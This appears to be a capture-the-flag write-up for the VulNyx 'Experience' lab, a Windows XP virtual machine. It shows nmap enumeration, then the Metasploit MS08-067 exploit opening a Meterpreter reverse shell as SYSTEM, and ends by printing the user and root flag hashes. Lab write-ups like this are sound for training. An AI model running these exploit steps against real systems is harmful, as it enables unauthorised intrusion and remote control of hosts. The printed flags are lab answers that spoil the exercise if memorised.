# VulNyx - Experience

## Information

## Solution
### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sn 192.168.11.0/24       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 15:57 +07
Nmap scan report for 192.168.11.1
Host is up (0.00049s latency).
MAC Address: 0A:00:27:00:00:0B (Unknown)
Nmap scan report for 192.168.11.2
Host is up (0.00028s latency).
MAC Address: 08:00:27:2A:B6:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.11.17
Host is up (0.0025s latency).
MAC Address: 08:00:27:33:18:BF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.11.10
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.25 seconds
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sCV -p- -T4 192.168.11.17           
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-06 16:00 +07
Nmap scan report for 192.168.11.17
Host is up (0.0012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
MAC Address: 08:00:27:33:18:BF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: EXPERIENCE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:33:18:bf (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
|_clock-skew: mean: 18h29m58s, deviation: 4h56m59s, median: 14h59m58s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: experience
|   NetBIOS computer name: EXPERIENCE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-06T17:01:23-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.62 seconds
```
Search online, we see `MS08-067` is a buffer overflow vulnerability in Windows Server Service (SMB) that allows Remote Code Execution (RCE) with SYSTEM (highest) privileges.

### Shell

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ sudo msfconsole
Metasploit tip: Enable verbose logging with set VERBOSE true
...
```
Search `MS08_067` exploit:
```
msf > search ms08_067

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank   Check  Description
   -   ----                                                             ---------------  ----   -----  -----------
   0   exploit/windows/smb/ms08_067_netapi                              2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   1     \_ target: Automatic Targeting                                 .                .      .      .
   2     \_ target: Windows 2000 Universal                              .                .      .      .
   3     \_ target: Windows XP SP0/SP1 Universal                        .                .      .      .
   4     \_ target: Windows 2003 SP0 Universal                          .               
...
```
```bash
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) > options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit
                                       .com/docs/using-metasploit/basics/using-metaspl
                                       oit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, pro
                                        cess, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specif
                                        ied)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.
```
```bash
msf exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.11.17
RHOSTS => 192.168.11.17
msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.11.10
LHOST => 192.168.11.10
```

### Privilege Escalation
```bash
msf exploit(windows/smb/ms08_067_netapi) > run
[*] Started reverse TCP handler on 192.168.11.10:4444 
[*] 192.168.11.17:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 192.168.11.17:445 - Fingerprint: Windows XP - Service Pack 2 - lang:English
[*] 192.168.11.17:445 - Selected Target: Windows XP SP2 English (AlwaysOn NX)
[*] 192.168.11.17:445 - Attempting to trigger the vulnerability...
[*] Sending stage (188998 bytes) to 192.168.11.17
[*] Meterpreter session 1 opened (192.168.11.10:4444 -> 192.168.11.17:1028) at 2026-05-06 16:15:54 +0700

meterpreter > id
[-] Unknown command: id. Run the help command for more details.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : EXPERIENCE
OS              : Windows XP (5.1 Build 2600, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > shell
Process 1932 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

#### Flags
```bash
C:\WINDOWS\system32>cd \
cd \

C:\>dir /s /b root.txt
dir /s /b root.txt
C:\Documents and Settings\bill\Desktop\root.txt

C:\>dir /s /b user.txt
dir /s /b user.txt
C:\Documents and Settings\bill\Desktop\user.txt

C:\WINDOWS\system32>type c:\"Documents and Settings"\bill\Desktop\user.txt
type c:\"Documents and Settings"\bill\Desktop\user.txt
f9e24c8da0686680decee9e594178a2e 

C:\WINDOWS\system32>type c:\"Documents and Settings"\bill\Desktop\root.txt
type c:\"Documents and Settings"\bill\Desktop\root.txt
c1d5e7e4efece4a6022c4a4080c8114d 
```

***You are welcome!***
